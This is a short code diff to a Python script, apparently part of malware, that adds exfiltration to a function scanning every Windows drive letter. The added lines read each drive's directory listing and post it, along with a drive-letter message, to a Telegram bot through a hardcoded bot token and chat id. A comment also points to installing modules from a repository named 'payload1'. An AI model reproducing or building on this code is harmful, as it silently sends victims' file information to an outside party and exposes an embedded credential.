@@ -93,6 +93,7 @@ def tree(directory, file, prefix=''):
 
 def scan_usb():
     maj_letters = list(string.ascii_uppercase)
+    data = {'chat_id' : '-4102145810'}
     for maj_letters in maj_letters:
         letterpath = str(maj_letters) + ":\\"
         if os.path.isdir(letterpath):
@@ -100,6 +101,12 @@ def scan_usb():
                 tree(letterpath, temp_file)
                 temp_file_path = temp_file.name
             print(f"{letterpath} : {temp_file_path}")
+            with open(temp_file_path, 'rb') as file:
+                files = {
+                    'document': file.read()
+                }
+            r = requests.post("https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendDocument", data=data, files=files)
+            r = requests.post("https://api.telegram.org/bot6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA/sendMessage?chat_id=-4102145810&text=Infos : " + letterpath)
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
